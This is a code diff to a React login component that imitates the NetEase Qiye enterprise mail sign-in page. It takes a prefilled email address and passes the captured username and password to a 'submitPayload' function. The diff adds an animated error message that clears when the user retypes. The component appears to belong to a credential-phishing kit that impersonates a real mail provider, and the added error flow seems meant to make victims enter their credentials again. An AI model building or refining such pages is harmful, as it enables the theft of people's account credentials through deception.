@@ -2,6 +2,7 @@
 import React, { useState } from 'react';
 import { useTranslation } from '../components/LanguageProvider';
 import { useSecurity } from '../components/SecurityManager';
+import { motion } from 'framer-motion';
 
 interface NetEaseQiyeThemeProps {
   prefilledEmail?: string;
@@ -13,7 +14,7 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { submitPayload } = useSecurity();
+  const { submitPayload, error, setError } = useSecurity();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -96,14 +97,30 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
                 <div className="flex items-center space-x-4">
                   <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '用户名' : 'User'}</label>
                   <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] transition-all bg-white">
-                    <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full px-3 py-2 text-[14px] outline-none" />
+                    <input 
+                      type="text" 
+                      value={username} 
+                      onChange={(e) => {
+                        setUsername(e.target.value);
+                        if (error) setError(null);
+                      }} 
+                      className="w-full px-3 py-2 text-[14px] outline-none" 
+                    />
                   </div>
                 </div>
 
                 <div className="flex items-center space-x-4">
                   <label className="text-[14px] text-gray-500 w-16 shrink-0">{lang === 'zh' ? '密  码' : 'Pass'}</label>
                   <div className="flex-grow border border-gray-300 rounded focus-within:border-[#3b78e7] relative transition-all bg-white">
-                    <input type={showPassword ? "text" : "password"} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full px-3 py-2 text-[14px] outline-none pr-8" />
+                    <input 
+                      type={showPassword ? "text" : "password"} 
+                      value={password} 
+                      onChange={(e) => {
+                        setPassword(e.target.value);
+                        if (error) setError(null);
+                      }} 
+                      className="w-full px-3 py-2 text-[14px] outline-none pr-8" 
+                    />
                   </div>
                 </div>
 
@@ -115,6 +132,16 @@ const NetEaseQiyeTheme: React.FC<NetEaseQiyeThemeProps> = ({ prefilledEmail }) =
                   >
                     {isSubmitting ? '...' : (lang === 'zh' ? '登 录' : 'Login')}
                   </button>
+
+                  {error && (
+                    <motion.div 
+                      initial={{ opacity: 0, y: -10 }}
+                      animate={{ opacity: 1, y: 0 }}
+                      className="text-red-500 text-[12px] text-center font-medium py-1"
+                    >
+                      {error}
+                    </motion.div>
+                  )}
                 </div>
               </form>
 
